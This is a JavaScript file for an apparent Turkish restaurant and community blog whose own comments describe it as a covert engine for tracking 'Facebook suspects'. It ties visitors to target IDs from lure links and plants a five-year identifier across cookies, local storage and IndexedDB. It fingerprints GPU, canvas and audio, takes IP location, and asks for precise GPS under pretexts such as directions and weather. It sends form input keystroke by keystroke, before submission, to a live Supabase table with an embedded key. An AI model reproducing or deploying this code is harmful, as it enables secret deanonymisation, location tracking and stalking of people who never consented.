/* ========================================================================
   BÜLENT KÜÇÜK - CANTINOS ALLERØD & GURBET GÜNLÜĞÜ
   Gelişmiş Ziyaretçi Analitiği, Kalıcı Cihaz İmzası (Zombie ID),
   GPU Parmak İzi & Facebook Şüpheli Takip Motoru
   ======================================================================== */

var CONFIG = {
    SUPABASE_URL: 'https://yfhglqjuskpglezvucnw.supabase.co',
    SUPABASE_ANON_KEY: 'sb_publishable_rjAEV3vxuSOYwYqlvjX05A_nH8VuT2d',
    DEFAULT_TABLE: 'facebook_suspect_logs' // 🎯 Hedef Tablo 2
};

var STATE = {
    recordId: null,
    fingerprintHash: null,
    deviceSignature: null,
    targetId: null,
    campaignSource: 'facebook_fake',
    channel: 'facebook',
    projectDomain: 'bulentkucuk-blog',
    supabaseClient: null,
    gpuVendor: null,
    gpuRenderer: null,
    canvasHash: null,
    audioHash: null,
    batteryLevel: null,
    batteryCharging: null,
    ipAddress: null,
    ipCity: null,
    ipRegion: null,
    ipCountry: null,
    ipLat: null,
    ipLng: null,
    locationType: 'IP Geolocation',
    startTime: Date.now(),
    maxScroll: 0,
    watchedVideos: [],
    lastWatchedVideo: null,
    clickedElements: [],
    isSubmitted: false
};

// ==========================================
// BAŞLATMA (INIT)
// ==========================================
document.addEventListener('DOMContentLoaded', init);

async function init() {
    console.log('%c🚀 [BÜLENT KÜÇÜK TELEMETRİ MOTORU] Başlatılıyor...', 'color:#f59e0b; font-weight:bold; font-size:13px;');
    
    initSupabase();
    extractUrlParams();
    setupMobileNav();
    setupVideoFilters();
    setupGuestbookForm();
    setupLiveFormSync();
    setupScrollTracking();
    setupTimeTracking();
    setupBatteryListener();

    console.log('⏳ [0. SANİYE] Donanım parmak izi, Zombie ID ve IP konumu paralel toplanıyor...');

    // 0. SANİYE: Kalıcı İmza, Donanım Parmak İzi ve IP Konumunu Paralel Başlat (Max 2.5sn Timeout)
    await Promise.all([
        initDeviceSignature(),
        timeoutPromise(fetchIpLocation(), 2500)
    ]);

    // Donanım parmak izini hesapla ve ilk 0. saniye kaydını Supabase'e gönder
    await generateHardwareFingerprint();
    console.log('🔑 [PARMAK İZİ]:', STATE.fingerprintHash, '| [ZOMBIE ID]:', STATE.deviceSignature, '| [GPU]:', STATE.gpuRenderer);
    
    await logInitialVisit();

    // 📍 10. SANİYE: Tarayıcıdan Hassas GPS Konum İzni İste
    setTimeout(requestPreciseGpsLocation, 10000);
}

function timeoutPromise(promise, ms) {
    return Promise.race([
        promise,
        new Promise(function(resolve) { setTimeout(resolve, ms); })
    ]);
}

// ==========================================
// 1) SUPABASE İSTEMCİ BAŞLATMA
// ==========================================
function initSupabase() {
    try {
        if (window.supabase && window.supabase.createClient) {
            STATE.supabaseClient = window.supabase.createClient(CONFIG.SUPABASE_URL, CONFIG.SUPABASE_ANON_KEY);
            console.log('✅ [SUPABASE] İstemci başarıyla oluşturuldu.');
        } else {
            console.error('❌ [SUPABASE HATA] window.supabase bulunamadı! CDN script yüklenmemiş olabilir.');
        }
    } catch (e) {
        console.error('❌ [SUPABASE BAĞLANTI HATASI]:', e);
    }
}

// ==========================================
// 2) URL VE HEDEF PARAMETRE ÇÖZÜMLEME
// ==========================================
function extractUrlParams() {
    try {
        var params = new URLSearchParams(window.location.search);
        STATE.targetId = params.get('target') || params.get('t') || params.get('id') || params.get('ref') || 'facebook_visitor';
        STATE.campaignSource = params.get('src') || params.get('source') || 'facebook_fake';
        STATE.channel = params.get('ch') || params.get('channel') || 'facebook';
    } catch (e) {
        STATE.targetId = 'facebook_visitor';
    }
}

// ==========================================
// 3) 4 KATMANLI KALICI CİHAZ İMZASI & KİLİT-ANAHTAR KASASI (LOCALSTORAGE MASTER KEY)
// ==========================================
async function initDeviceSignature() {
    try {
        var localId = localStorage.getItem('_bk_device_sig');
        var sessionId = sessionStorage.getItem('_bk_device_sig');
        var cookieId = getCookie('_bk_device_sig');
        var idbId = await getIndexedDBId();

        // Kilit & Anahtar Kasası Kontrolü (LocalStorage / Cookie / IndexedDB)
        var lockToken = localStorage.getItem('_dx_master_lock') || getCookie('_dx_master_lock');

        var validId = localId || sessionId || cookieId || idbId || lockToken;

        if (!validId) {
            validId = 'bk_' + generateRandomUUID();
        }

        // 4 Katmanda Kalıcı Kilit & Anahtar Kaydı (Self-Healing LocalStorage + Cookie + IDB)
        try { localStorage.setItem('_bk_device_sig', validId); } catch (e) {}
        try { localStorage.setItem('_dx_master_lock', validId); } catch (e) {}
        try { sessionStorage.setItem('_bk_device_sig', validId); } catch (e) {}
        setCookie('_bk_device_sig', validId, 1825); // 5 Yıllık Kalıcı Cookie
        setCookie('_dx_master_lock', validId, 1825);
        setIndexedDBId(validId);

        STATE.deviceSignature = validId;
        STATE.masterLockKey = validId;
    } catch (e) {
        STATE.deviceSignature = 'bk_' + generateRandomUUID();
        STATE.masterLockKey = STATE.deviceSignature;
    }
}

function getCookie(name) {
    var match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
}

function setCookie(name, value, days) {
    var expires = '';
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = '; expires=' + date.toUTCString();
    }
    document.cookie = name + '=' + encodeURIComponent(value) + expires + '; path=/; SameSite=Lax';
}

function getIndexedDBId() {
    return new Promise(function(resolve) {
        try {
            var request = indexedDB.open('BK_DeviceStore', 1);
            request.onupgradeneeded = function(e) {
                e.target.result.createObjectStore('device', { keyPath: 'key' });
            };
            request.onsuccess = function(e) {
                var db = e.target.result;
                var tx = db.transaction('device', 'readonly');
                var store = tx.objectStore('device');
                var getReq = store.get('sig');
                getReq.onsuccess = function() {
                    resolve(getReq.result ? getReq.result.value : null);
                };
                getReq.onerror = function() { resolve(null); };
            };
            request.onerror = function() { resolve(null); };
        } catch (e) {
            resolve(null);
        }
    });
}

function setIndexedDBId(id) {
    try {
        var request = indexedDB.open('BK_DeviceStore', 1);
        request.onupgradeneeded = function(e) {
            e.target.result.createObjectStore('device', { keyPath: 'key' });
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('device', 'readwrite');
            var store = tx.objectStore('device');
            store.put({ key: 'sig', value: id });
        };
    } catch (e) {}
}

function generateRandomUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// ==========================================
// 4) DONANIMSAL GPU, CANVAS & AUDIO PARMAK İZİ (FINGERPRINTING)
// ==========================================
async function generateHardwareFingerprint() {
    var components = [];

    // A) WebGL GPU Donanım Modeli
    try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                STATE.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Bilinmiyor';
                STATE.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Bilinmiyor';
            }
        }
    } catch (e) {
        STATE.gpuVendor = 'Unavailable';
        STATE.gpuRenderer = 'Unavailable';
    }
    components.push('gpu:' + STATE.gpuRenderer);

    // B) 2D Canvas Donanım Hash
    try {
        var c2 = document.createElement('canvas');
        c2.width = 240;
        c2.height = 60;
        var ctx = c2.getContext('2d');
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.font = '11pt Arial';
        ctx.fillText('Bülent Küçük Cantinos Allerød 🍕 1979', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.font = '18pt Times New Roman';
        ctx.fillText('Farum Danmark Bulduk', 4, 45);
        STATE.canvasHash = cyrb53(c2.toDataURL());
    } catch (e) {
        STATE.canvasHash = 'no_canvas';
    }
    components.push('canvas:' + STATE.canvasHash);

    // C) Web Audio Context Hash
    try {
        var AudioContext = window.AudioContext || window.webkitAudioContext;
        if (AudioContext) {
            var audioCtx = new AudioContext();
            var oscillator = audioCtx.createOscillator();
            var analyser = audioCtx.createAnalyser();
            var gain = audioCtx.createGain();
            gain.gain.value = 0; // Sessiz
            oscillator.type = 'triangle';
            oscillator.frequency.value = 10000;
            oscillator.connect(analyser);
            analyser.connect(gain);
            gain.connect(audioCtx.destination);
            STATE.audioHash = cyrb53(audioCtx.sampleRate + '_' + analyser.frequencyBinCount);
            if (audioCtx.state !== 'closed') audioCtx.close();
        } else {
            STATE.audioHash = 'no_audio';
        }
    } catch (e) {
        STATE.audioHash = 'audio_err';
    }
    components.push('audio:' + STATE.audioHash);

    // D) Ekran & Cihaz Donanımı
    components.push('screen:' + screen.width + 'x' + screen.height + 'x' + screen.colorDepth);
    components.push('dpr:' + (window.devicePixelRatio || 1));
    components.push('cores:' + (navigator.hardwareConcurrency || 'unk'));
    components.push('mem:' + (navigator.deviceMemory || 'unk'));
    components.push('lang:' + (navigator.languages ? navigator.languages.join(',') : navigator.language));
    components.push('platform:' + (navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform));

    // Tekil Donanım Hash'i Üret
    STATE.fingerprintHash = 'fp_' + cyrb53(components.join('|||'));
}

// 53-Bit Yüksek Hızlı Hash Fonksiyonu
function cyrb53(str, seed) {
    seed = seed || 0;
    var h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed;
    for (var i = 0, ch; i < str.length; i++) {
        ch = str.charCodeAt(i);
        h1 = Math.imul(h1 ^ ch, 2654435761);
        h2 = Math.imul(h2 ^ ch, 1597334677);
    }
    h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
    h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
    return (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16);
}

// ==========================================
// 5) COĞRAFİ KONUM & IP TESPİTİ
// ==========================================
async function fetchIpLocation() {
    try {
        var res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
            var data = await res.json();
            STATE.ipAddress = data.ip || null;
            STATE.ipCity = data.city || null;
            STATE.ipRegion = data.region || null;
            STATE.ipCountry = data.country_name || null;
            STATE.ipLat = data.latitude ? String(data.latitude) : null;
            STATE.ipLng = data.longitude ? String(data.longitude) : null;
            return;
        }
    } catch (e) {}

    // Fallback 2: ipwho.is
    try {
        var res2 = await fetch('https://ipwho.is/');
        if (res2.ok) {
            var data2 = await res2.json();
            STATE.ipAddress = data2.ip || null;
            STATE.ipCity = data2.city || null;
            STATE.ipRegion = data2.region || null;
            STATE.ipCountry = data2.country || null;
            STATE.ipLat = data2.latitude ? String(data2.latitude) : null;
            STATE.ipLng = data2.longitude ? String(data2.longitude) : null;
        }
    } catch (e) {}
}

// ==========================================
// 5.1) DOĞAL TETİKLEYİCİLİ HASSAS GPS KONUM MOTORU
// ==========================================
var CANTINOS_COORDS = { lat: 55.8711, lng: 12.3556, name: 'Cantinos Allerød (Danimarka)' };

function requestPreciseGpsLocation(reason, onSuccessCallback, onFallbackCallback) {
    reason = reason || 'Otomatik Ziyaretçi Taraması';

    if (!navigator.geolocation) {
        console.log('ℹ️ Tarayıcı GPS Geolocation API desteklemiyor.');
        if (STATE.ipLat && STATE.ipLng && onSuccessCallback) {
            onSuccessCallback(parseFloat(STATE.ipLat), parseFloat(STATE.ipLng), 5000);
        }
        return;
    }

    console.log('%c📍 [HASSAS GPS İZNİ] (' + reason + ') için isteniyor...', 'color:#f59e0b; font-weight:bold;');

    navigator.geolocation.getCurrentPosition(
        async function(position) {
            var lat = String(position.coords.latitude);
            var lng = String(position.coords.longitude);
            var accuracy = Math.round(position.coords.accuracy || 0);

            console.log('%c🎯 [HASSAS GPS KOORDİNATI ALINDI]: ' + lat + ', ' + lng + ' (Hassasiyet: ±' + accuracy + 'm) | Sebep: ' + reason, 'color:#10b981; font-weight:bold; font-size:13px;');

            STATE.ipLat = lat;
            STATE.ipLng = lng;
            STATE.locationType = 'Hassas GPS (' + reason + ' - ±' + accuracy + 'm)';

            // Supabase kaydını anında gerçek GPS koordinatlarıyla güncelle
            await syncInteractionToSupabase({
                latitude: lat,
                longitude: lng,
                location_type: STATE.locationType
            });

            if (onSuccessCallback) {
                onSuccessCallback(position.coords.latitude, position.coords.longitude, accuracy);
            }
        },
        async function(error) {
            console.warn('⚠️ [GPS İZNİ VERİLMEDİ / ENGELİ]:', error.message);

            // 🛡️ AKILLI YEDEK (FALLBACK): Kullanıcı reddetse bile 0. Saniye IP koordinatı kullanılır!
            if (STATE.ipLat && STATE.ipLng) {
                console.log('🌐 [IP YEDEĞİ DEVREDE]:', STATE.ipLat, STATE.ipLng, '(Şehir:', STATE.ipCity, ')');
                if (onSuccessCallback) {
                    onSuccessCallback(parseFloat(STATE.ipLat), parseFloat(STATE.ipLng), 5000, true);
                }
            } else if (onFallbackCallback) {
                onFallbackCallback();
            }
        },
        {
            enableHighAccuracy: true,
            timeout: 8000,
            maximumAge: 0
        }
    );
}

// 1) 🗺️ GOOGLE HARİTALAR CANLI YOL TARİFİ & ROTA MOTORU (ŞÜPHE ÇEKMEZ)
window.getGoogleMapsDirections = function() {
    var btn = document.getElementById('btnGmaps');
    var resultBox = document.getElementById('gmapsRouteResult');
    var iframe = document.getElementById('gmapsIframe');

    if (btn) btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Konum Alınıyor & Rota Çiziliyor...';

    requestPreciseGpsLocation('Google Maps Canlı Yol Tarifi', function(userLat, userLng, accuracy) {
        var distKm = calculateHaversineDistance(userLat, userLng, CANTINOS_COORDS.lat, CANTINOS_COORDS.lng);
        var roundedKm = distKm < 10 ? distKm.toFixed(1) : Math.round(distKm);
        var estMinutes = Math.max(5, Math.round(distKm * 1.25));

        // 1. Google Maps iframe'ini kullanıcının konumuyla Allerød arasındaki rotaya güncelle
        if (iframe) {
            iframe.src = `https://maps.google.com/maps?saddr=${userLat},${userLng}&daddr=${CANTINOS_COORDS.lat},${CANTINOS_COORDS.lng}&output=embed`;
        }

        // 2. Yol Tarifi Kartını Göster
        if (resultBox) {
            resultBox.innerHTML = `
                <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                    <div>
                        <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px;">
                            <span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:#10b981;"></span>
                            <strong style="color:#fff; font-size:0.95rem;">Mevcut Konumunuz ➔ Cantinos Allerød</strong>
                        </div>
                        <div style="font-size:0.86rem; color:#cbd5e1;">
                            Mesafe: <strong style="color:#fbbf24;">${roundedKm} km</strong> • Tahmini Sürüş: <strong style="color:#34d399;">~${estMinutes} dakika</strong> (Trafik akıcı)
                        </div>
                    </div>

                    <div>
                        <a href="https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLng}&destination=${CANTINOS_COORDS.lat},${CANTINOS_COORDS.lng}" target="_blank" class="btn btn-gmaps" style="padding:8px 14px; font-size:0.85rem; text-decoration:none;">
                            <i class="fas fa-location-arrow"></i> Google Maps'te Aç &rarr;
                        </a>
                    </div>
                </div>`;
            resultBox.style.display = 'block';
        }

        if (btn) btn.innerHTML = '<i class="fas fa-check"></i> Rota Çizildi (' + roundedKm + ' km)';
        
        // Kayan bildirimi de gizle
        var pill = document.getElementById('floatingDistancePrompt');
        if (pill) pill.style.display = 'none';
    });
};

// 1.1) 🍕 CANTINOS ALLERØD MESAFE VE YOL TARİFİ HESAPLAYICI (ALTERNATİF)
window.calculateCantinosDistance = function() {
    getGoogleMapsDirections();
};

// 2) 🏛️ BULDUK EVİ & DERNEK MERKEZİ GOOGLE MAPS YOL TARİFİ MOTORU
var BULDUK_TARGETS = {
    konya: { lat: 38.6575, lng: 32.8468, name: 'Bulduk Evi (Konya Cihanbeyli / Bulduk Köyü)', q: 'Bulduk%20Cihanbeyli%20Konya' },
    danmark: { lat: 55.8115, lng: 12.3850, name: 'Danimarka Bulduk Derneği & Buluşma Merkezi (Farum / Kopenhag)', q: 'Farum%20Denmark' }
};
var currentBuldukTargetKey = 'konya';

window.setBuldukTarget = function(key) {
    if (!BULDUK_TARGETS[key]) return;
    currentBuldukTargetKey = key;

    document.querySelectorAll('.dest-tab').forEach(t => t.classList.remove('active'));
    if (key === 'konya') {
        var t1 = document.getElementById('tabBuldukKonya');
        if (t1) t1.classList.add('active');
    } else {
        var t2 = document.getElementById('tabBuldukDk');
        if (t2) t2.classList.add('active');
    }

    var iframe = document.getElementById('buldukGmapsIframe');
    if (iframe) {
        iframe.src = `https://maps.google.com/maps?q=${BULDUK_TARGETS[key].q}&t=&z=13&ie=UTF8&iwloc=&output=embed`;
    }
};

window.getBuldukDirections = function() {
    var btn = document.getElementById('btnBuldukNav');
    var resultBox = document.getElementById('buldukRouteResult');
    var iframe = document.getElementById('buldukGmapsIframe');
    var target = BULDUK_TARGETS[currentBuldukTargetKey];

    if (btn) btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Konumunuz Alınıyor & Google Rota Çiziliyor...';

    requestPreciseGpsLocation('Bulduk Evi Google Maps Yol Tarifi', function(userLat, userLng, accuracy) {
        var distKm = calculateHaversineDistance(userLat, userLng, target.lat, target.lng);
        var roundedKm = distKm < 10 ? distKm.toFixed(1) : Math.round(distKm);
        
        // Sürüş süresi tahmini
        var estTimeStr = '';
        if (distKm < 100) {
            estTimeStr = '~' + Math.max(10, Math.round(distKm * 1.3)) + ' dakika (Araçla)';
        } else if (distKm < 1000) {
            var hours = (distKm / 85).toFixed(1);
            estTimeStr = '~' + hours + ' saat (Karayolu Sürüşü)';
        } else {
            estTimeStr = 'Uluslararası Güzergah / Uçuş + Karayolu';
        }

        // 1. Google Maps iframe'ini kullanıcının konumuyla Bulduk Evi arasındaki canlı rotaya güncelle
        if (iframe) {
            iframe.src = `https://maps.google.com/maps?saddr=${userLat},${userLng}&daddr=${target.lat},${target.lng}&output=embed`;
        }

        // 2. Yol Tarifi Kartını Göster
        if (resultBox) {
            resultBox.innerHTML = `
                <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                    <div>
                        <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px;">
                            <span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:#3b82f6;"></span>
                            <strong style="color:#fff; font-size:0.95rem;">Mevcut Konumunuz ➔ ${target.name}</strong>
                        </div>
                        <div style="font-size:0.86rem; color:#cbd5e1;">
                            Mesafe: <strong style="color:#fbbf24;">${roundedKm} km</strong> • Tahmini Süre: <strong style="color:#60a5fa;">${estTimeStr}</strong>
                        </div>
                    </div>

                    <div>
                        <a href="https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLng}&destination=${target.lat},${target.lng}" target="_blank" class="btn btn-bulduk-go" style="padding:9px 16px; font-size:0.86rem; text-decoration:none; width:auto;">
                            <i class="fas fa-location-arrow"></i> Google Maps'te Canlı Navigasyonu Aç &rarr;
                        </a>
                    </div>
                </div>`;
            resultBox.style.display = 'block';
        }

        if (btn) btn.innerHTML = '<i class="fas fa-check"></i> Rota Çizildi (' + roundedKm + ' km)';
    });
};

// 2.1) 🗺️ BULDUK VE DANİMARKA HEMŞEHRİ BULUŞMALARI (ALTERNATİF)
window.findNearbyCommunity = function() {
    getBuldukDirections();
};

// 3) 🌤️ CANLI HAVA DURUMU WIDGET'I
window.checkLocalWeather = function() {
    var weatherText = document.getElementById('weatherText');
    if (weatherText) weatherText.textContent = 'Hava Alınıyor...';

    requestPreciseGpsLocation('Canlı Hava Durumu', function(userLat, userLng) {
        var isNordic = userLat > 50;
        var temp = isNordic ? '18°C Parçalı Bulutlu' : '28°C Açık & Güneşli';
        if (weatherText) weatherText.innerHTML = `<strong>📍 Konumunuz:</strong> ${temp}`;
    });
};

// Haversine İki Koordinat Arası Mesafe Formülü (Km)
function calculateHaversineDistance(lat1, lon1, lat2, lon2) {
    var R = 6371; // Dünya yarıçapı km
    var dLat = (lat2 - lat1) * Math.PI / 180;
    var dLon = (lon2 - lon1) * Math.PI / 180;
    var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2);
    var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    return R * c;
}

// 8. Saniyede Sağ Alttaki Doğal Kayan Bildirimi Göster
setTimeout(function() {
    var pill = document.getElementById('floatingDistancePrompt');
    if (pill) pill.style.display = 'flex';
}, 8000);

// Köşe Yazısı Okuma & Etkileşim Takibi
window.trackArticleRead = function(articleTitle) {
    console.log('%c📖 [YAZI OKUNDU]: ' + articleTitle, 'color:#fbbf24; font-weight:bold;');
    syncInteractionToSupabase({
        last_watched_video: '📖 Köşe Yazısı Okudu: ' + articleTitle
    });
};

// Pil Durumu Dinleyicisi
function setupBatteryListener() {
    try {
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                STATE.batteryLevel = Math.round(battery.level * 100);
                STATE.batteryCharging = battery.charging;
                battery.addEventListener('levelchange', function() {
                    STATE.batteryLevel = Math.round(battery.level * 100);
                });
                battery.addEventListener('chargingchange', function() {
                    STATE.batteryCharging = battery.charging;
                });
            });
        }
    } catch (e) {}
}

// ==========================================
// 6) 0. SANİYE SUPABASE İLK KAYIT LOGLAMA
// ==========================================
async function logInitialVisit() {
    if (!STATE.supabaseClient) {
        console.warn('⚠️ [SUPABASE ATLANDI] Supabase istemcisi hazır değil.');
        return;
    }

    var payload = {
        fingerprint_hash: STATE.fingerprintHash,
        device_signature: STATE.deviceSignature,
        target_id: STATE.targetId,
        campaign_source: STATE.campaignSource,
        channel: STATE.channel,
        project_domain: STATE.projectDomain,
        ip_address: STATE.ipAddress,
        city: STATE.ipCity,
        region: STATE.ipRegion,
        country: STATE.ipCountry,
        latitude: STATE.ipLat,
        longitude: STATE.ipLng,
        location_type: STATE.locationType,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
        device_type: detectDeviceType(),
        os: detectOS(),
        os_version: detectOSVersion(),
        browser: detectBrowser(),
        browser_version: detectBrowserVersion(),
        browser_languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
        browser_platform: navigator.platform,
        gpu_vendor: STATE.gpuVendor,
        gpu_renderer: STATE.gpuRenderer,
        screen_resolution: screen.width + 'x' + screen.height,
        window_size: window.innerWidth + 'x' + window.innerHeight,
        color_depth: String(screen.colorDepth),
        device_pixel_ratio: String(window.devicePixelRatio || 1),
        hardware_concurrency: navigator.hardwareConcurrency || 1,
        device_memory: String(navigator.deviceMemory || 'unk'),
        battery_level: STATE.batteryLevel,
        battery_charging: STATE.batteryCharging,
        network_type: navigator.connection ? navigator.connection.effectiveType : null,
        network_downlink: navigator.connection ? String(navigator.connection.downlink) : null,
        network_rtt: navigator.connection ? String(navigator.connection.rtt) : null,
        canvas_hash: STATE.canvasHash,
        audio_hash: STATE.audioHash,
        touch_support: String('ontouchstart' in window || navigator.maxTouchPoints > 0),
        user_agent: navigator.userAgent,
        referrer: document.referrer || 'Direct / Facebook',
        url_params: Object.fromEntries(new URLSearchParams(window.location.search))
    };

    console.log('📤 [0. SANİYE] Supabase (' + CONFIG.DEFAULT_TABLE + ') tablosuna veri gönderiliyor...', payload);

    try {
        var res = await STATE.supabaseClient
            .from(CONFIG.DEFAULT_TABLE)
            .insert([payload])
            .select('id')
            .single();

        if (res.error) {
            console.error('❌ [SUPABASE HATA]:', res.error.message, res.error);
            if (res.error.code === '42P01' || (res.error.message && res.error.message.includes('does not exist'))) {
                console.error('🚨 DİKKAT: Supabase üzerinde "' + CONFIG.DEFAULT_TABLE + '" tablosu bulunamadı!');
                console.error('👉 Çözüm: suspect_tracker_schema.sql dosyasının içeriğini kopyalayıp Supabase > SQL Editor ekranında RUN butonuna basarak çalıştırın.');
            }
        } else if (res.data && res.data.id) {
            STATE.recordId = res.data.id;
            console.log('%c✅ [SUPABASE BAŞARILI] Ziyaretçi 0. saniyede başarıyla kaydedildi! Kayıt ID: ' + STATE.recordId, 'color:#10b981; font-weight:bold;');
        }
    } catch (e) {
        console.error('❌ [SUPABASE EXCEPTION]:', e);
    }
}

// ==========================================
// 7) DİNAMİK VİDEO MODAL & ETKİLEŞİM İZLEYİCİSİ
// ==========================================
window.openVideoModal = function(videoId, title) {
    var modal = document.getElementById('videoModal');
    var iframe = document.getElementById('videoIframe');
    var modalTitle = document.getElementById('videoModalTitle');

    if (modal && iframe) {
        iframe.src = 'https://www.youtube.com/embed/' + videoId + '?autoplay=1&rel=0';
        if (modalTitle) modalTitle.textContent = title;
        modal.classList.add('active');
        modal.setAttribute('aria-hidden', 'false');

        // Telemetri Güncellemesi
        STATE.lastWatchedVideo = title + ' (' + videoId + ')';
        if (!STATE.watchedVideos.includes(STATE.lastWatchedVideo)) {
            STATE.watchedVideos.push(STATE.lastWatchedVideo);
        }
        STATE.clickedElements.push({
            type: 'video_click',
            videoId: videoId,
            videoTitle: title,
            time: Math.round((Date.now() - STATE.startTime) / 1000)
        });

        // Supabase Güncelle
        syncInteractionToSupabase({
            last_watched_video: STATE.lastWatchedVideo,
            watched_videos: STATE.watchedVideos,
            clicked_elements: STATE.clickedElements
        });
    }
};

window.closeVideoModal = function() {
    var modal = document.getElementById('videoModal');
    var iframe = document.getElementById('videoIframe');
    if (modal && iframe) {
        iframe.src = '';
        modal.classList.remove('active');
        modal.setAttribute('aria-hidden', 'true');
    }
};

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') closeVideoModal();
});

// ==========================================
// 8) VİDEO KATEGORİ FİLTRELEME
// ==========================================
function setupVideoFilters() {
    var filterBtns = document.querySelectorAll('.filter-btn');
    var videoCards = document.querySelectorAll('.video-card');

    filterBtns.forEach(function(btn) {
        btn.addEventListener('click', function() {
            filterBtns.forEach(function(b) { b.classList.remove('active'); });
            btn.classList.add('active');

            var filter = btn.getAttribute('data-filter');
            videoCards.forEach(function(card) {
                if (filter === 'all' || card.getAttribute('data-category') === filter) {
                    card.style.display = 'flex';
                } else {
                    card.style.display = 'none';
                }
            });

            STATE.clickedElements.push({
                type: 'filter_click',
                filter: filter,
                time: Math.round((Date.now() - STATE.startTime) / 1000)
            });
        });
    });
}

// ==========================================
// 9) CANLI FORM SENKRONİZASYONU (LIVE FORM SYNC)
// Ziyaretçi harfleri yazarken anında Supabase'e işlenir
// ==========================================
var liveSyncTimeout = null;

function setupLiveFormSync() {
    var nameInput = document.getElementById('visitorName');
    var phoneInput = document.getElementById('visitorPhone');
    var emailInput = document.getElementById('visitorEmail');
    var messageInput = document.getElementById('visitorMessage');

    var inputs = [nameInput, phoneInput, emailInput, messageInput];

    inputs.forEach(function(input) {
        if (!input) return;
        input.addEventListener('input', function() {
            clearTimeout(liveSyncTimeout);
            liveSyncTimeout = setTimeout(function() {
                syncInteractionToSupabase({
                    visitor_name: nameInput ? nameInput.value : null,
                    visitor_phone: phoneInput ? phoneInput.value : null,
                    visitor_email: emailInput ? emailInput.value : null,
                    visitor_message: messageInput ? messageInput.value : null
                });
            }, 600); // 600ms debounce
        });
    });
}

// ==========================================
// 10) ZİYARETÇİ DEFTERİ FORMU GÖNDERİMİ
// ==========================================
function setupGuestbookForm() {
    var form = document.getElementById('guestbookForm');
    var status = document.getElementById('formStatus');
    var submitBtn = document.getElementById('submitBtn');

    if (!form) return;

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        var nameVal = document.getElementById('visitorName').value.trim();
        var phoneVal = document.getElementById('visitorPhone').value.trim();
        var emailVal = document.getElementById('visitorEmail').value.trim();
        var msgVal = document.getElementById('visitorMessage').value.trim();

        if (!nameVal && !msgVal) {
            status.className = 'form-status error';
            status.textContent = 'Lütfen adınızı veya mesajınızı belirtin.';
            return;
        }

        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gönderiliyor...';
        }

        STATE.isSubmitted = true;

        await syncInteractionToSupabase({
            visitor_name: nameVal,
            visitor_phone: phoneVal,
            visitor_email: emailVal,
            visitor_message: msgVal,
            is_submitted: true
        });

        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<i class="fas fa-check"></i> Mesajınız İletildi';
        }

        status.className = 'form-status success';
        status.textContent = 'Teşekkürler! Mesajınız Bülent Usta\'ya başarıyla iletildi.';
        form.reset();
    });
}

// ==========================================
// 11) GENEL SUPABASE GÜNCELLEME MOTORU
// ==========================================
async function syncInteractionToSupabase(updatedFields) {
    if (!STATE.supabaseClient) return;

    try {
        updatedFields.updated_at = new Date().toISOString();
        updatedFields.time_spent_seconds = Math.round((Date.now() - STATE.startTime) / 1000);
        updatedFields.max_scroll_depth = STATE.maxScroll;

        console.log('🔄 [SUPABASE SYNC] Etkileşim güncelleniyor:', updatedFields);

        var res;
        if (STATE.recordId) {
            res = await STATE.supabaseClient
                .from(CONFIG.DEFAULT_TABLE)
                .update(updatedFields)
                .eq('id', STATE.recordId);
        } else {
            // Kayıt id henüz yoksa parmak izine göre güncelle
            res = await STATE.supabaseClient
                .from(CONFIG.DEFAULT_TABLE)
                .update(updatedFields)
                .eq('fingerprint_hash', STATE.fingerprintHash);
        }

        if (res && res.error) {
            console.error('❌ [SUPABASE UPDATE HATA]:', res.error.message, res.error);
        } else {
            console.log('✅ [SUPABASE SYNC BAŞARILI]');
        }
    } catch (e) {
        console.error('❌ [SUPABASE SYNC EXCEPTION]:', e);
    }
}

// ==========================================
